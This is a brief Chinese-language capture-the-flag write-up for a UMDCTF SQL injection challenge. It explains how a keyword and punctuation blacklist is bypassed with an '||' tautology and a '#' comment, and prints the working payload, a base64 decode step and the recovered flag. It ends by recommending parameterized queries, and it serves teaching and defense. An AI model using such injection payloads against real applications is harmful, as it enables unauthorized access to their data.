# Return of the Flag Bay

## 题目简述

题目提供查询接口，后端把输入直接拼进 MySQL 语句。过滤器删除连字符、分号和带空格的常见关键字，却没有阻止字符串拼接运算符 `||` 与 `#` 注释，仍可构造恒真条件。

## 解题过程

输入会进入类似：

```sql
SELECT ... FROM ... WHERE name = '<input>';
```

过滤器虽然会删掉分号，但以下 payload 不依赖保留分号：

```text
'|| '1'='1';#
```

经过过滤后，核心仍形成：

```sql
... WHERE name = '' || '1'='1' #'
```

`'1'='1'` 为真，`#` 注释掉服务端补上的尾部引号。请求返回的数据经过 Base64 包装，解码响应：

```bash
printf '%s' '<response>' | base64 -d
```

得到：

```text
UMDCTF-{84y_w425_3p150d33_23v3n93_0f_7h3_f149_84y}
```

## 方法总结

SQL 注入黑名单很难覆盖数据库的等价语法、注释和运算符。可靠修复是参数化查询，并把用户输入作为数据绑定；删关键字或标点既会误伤正常输入，也不能建立语法边界。本题还需注意响应的 Base64 只是传输编码。
